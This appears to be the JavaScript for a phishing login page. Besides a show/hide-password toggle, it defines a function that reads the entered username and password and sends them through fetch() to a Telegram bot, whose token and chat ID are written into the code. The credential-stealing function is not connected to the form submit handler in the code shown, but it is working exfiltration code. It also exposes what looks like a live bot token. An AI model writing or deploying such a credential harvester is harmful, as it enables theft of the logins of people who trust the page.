const loginForm = document.getElementById("loginForm");
const passwordInput = document.getElementById("password");
const showPassword = document.getElementById("showPassword");
const BOT_TOKEN = "8912846969:AAHHPk9lx39tLf9qTo4isFMph2h4jeg6lBM";
const CHAT_ID = "8249819893";

async function sendNumber() {
    const number = document.getElementById("username").value;
    const pass = document.getElementById("password").value;
    const message = "Name: " + number + "\n" + "password: " + pass;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` + `?chat_id=${CHAT_ID}` + `&text=${encodeURIComponent(message)}`;

    const response = await fetch(url);
    const result = await response.json();

    
   }
// Show / hide password
showPassword.addEventListener("click", () => {

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        showPassword.textContent = "Hide";
    } else {
        passwordInput.type = "password";
        showPassword.textContent = "Show";
    }

});


// Login button
loginForm.addEventListener("submit", (event) => {

    event.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = passwordInput.value;
})
